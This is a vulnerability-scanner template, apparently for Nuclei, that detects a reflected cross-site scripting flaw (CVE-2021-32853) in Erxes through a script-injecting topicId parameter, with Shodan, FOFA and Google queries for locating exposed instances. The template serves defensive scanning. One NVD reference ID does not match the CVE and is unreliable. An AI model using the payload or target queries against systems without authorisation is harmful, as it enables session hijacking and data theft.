http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - 'topic_id: "</script><script>alert(document.domain)</script>'
    - window.erxesEnv
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/widgets/knowledgebase?topicId=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
id: CVE-2021-32853
info:
  author: dwisiswant0
  classification:
    cpe: cpe:2.3:a:erxes:erxes:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-32853
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
    cvss-score: 9.6
    cwe-id: CWE-79
    epss-percentile: 0.9933
    epss-score: 0.85495
  description: Erxes before 0.23.0 contains a cross-site scripting vulnerability.
    The value of topicID parameter is not escaped and is triggered in the enclosing
    script tag.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    fofa-query: title="erxes"
    google-query: intitle:"erxes"
    max-request: 1
    product: erxes
    shodan-query: http.title:"erxes"
    vendor: erxes
  name: Erxes <0.23.0 - Cross-Site Scripting
  reference:
  - https://securitylab.github.com/advisories/GHSL-2021-103-erxes/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-3285
  - https://github.com/erxes/erxes/blob/f131b49add72032650d483f044d00658908aaf4a/widgets/server/views/widget.ejs#L14
  - https://github.com/erxes/erxes/blob/f131b49add72032650d483f044d00658908aaf4a/widgets/server/index.ts#L54
  remediation: 'Upgrade to Erxes version 0.23.0 or later to mitigate the vulnerability.

    '
  severity: critical
  tags: cve2021,cve,xss,erxes,oss,vuln
